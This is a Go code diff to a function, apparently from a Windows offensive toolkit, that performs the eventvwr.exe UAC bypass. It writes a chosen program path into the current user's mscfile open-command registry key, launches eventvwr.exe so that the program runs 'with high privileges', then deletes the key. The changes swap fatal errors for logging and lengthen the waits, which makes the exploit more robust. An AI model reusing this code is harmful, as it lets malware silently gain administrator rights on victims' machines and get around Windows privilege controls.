@@ -38,14 +38,14 @@ func HWND_W32_Method_Eventvwr(path string) error {
 	var currentDir string
 	currentDir, err = filepath.Abs(path)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	_, _, err = registry.CreateKey(
 		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
 		registry.SET_VALUE|registry.ALL_ACCESS)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	wkey32, err = registry.OpenKey(
@@ -53,25 +53,25 @@ func HWND_W32_Method_Eventvwr(path string) error {
 		registry.QUERY_VALUE|registry.SET_VALUE,
 	)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Setting DEFAULT key value for the ABSOLUTE program path
 	// +0x23df ...
 
 	if err := wkey32.SetStringValue("", currentDir); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Absolute key function closing
 	// +0x54ef ...
 
 	if err := wkey32.Close(); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
-	// Sleep for 4 seconds ...
-	time.Sleep(1 * 1 * time.Second)
+	// Sleep for 5 seconds ...
+	time.Sleep(5 * 1 * time.Second)
 
 	// Executing EventVWR.exe
 	// Executing ABSOLUTE program name with high privileges
@@ -79,10 +79,11 @@ func HWND_W32_Method_Eventvwr(path string) error {
 	var cmd = exec.Command("eventvwr.exe")
 	err = cmd.Run()
 
-	time.Sleep(1 * 1 * time.Second)
+	// Sleep for 5 seconds ...
+	time.Sleep(5 * 1 * time.Second)
 	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	return err
